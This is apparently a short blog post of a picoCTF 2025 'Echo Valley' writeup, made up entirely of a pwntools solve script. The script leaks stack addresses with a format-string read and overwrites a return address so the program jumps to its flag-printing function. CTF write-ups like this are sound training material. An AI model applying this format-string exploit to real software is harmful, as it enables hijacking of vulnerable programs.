---
layout: post
title:  "picoCTF 2025 Echo Valley Writeup"
date:   2025-06-13 11:33:24 -0400
tags: ctf
---
Solve script:
```python
import re
from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./valley')
p = remote('shape-facility.picoctf.net', 55728)

p.recvuntil(b"Try Shouting: \n")
p.sendline(b"%20$p.%21$p")
res = p.recvline()
matches = re.findall(rb'0x[0-9a-fA-F]+', res)

return_addr_ptr, main_return_addr = matches

return_addr_ptr = int(return_addr_ptr, 16) - 8
main_return_addr = int(main_return_addr, 16)

print_flag_addr = main_return_addr - 426

chunks = [
    print_flag_addr        & 0xffff,               # lowest 2 bytes
    (print_flag_addr >> 16) & 0xffff,              # middle 2 bytes
    (print_flag_addr >> 32) & 0xffff,              # upper 2 bytes
]

write_addrs = [
    return_addr_ptr,
    return_addr_ptr + 2,
    return_addr_ptr + 4,
]

p.sendline(fmtstr_payload(offset=6, writes={write_addrs[0]: chunks[0]}))
p.recv()
p.sendline(fmtstr_payload(offset=6, writes={write_addrs[1]: chunks[1]}))
p.recv()

p.sendline(fmtstr_payload(offset=6, writes={write_addrs[2]: chunks[2]}))
p.recv()
p.sendline(b'exit')

p.interactive()
```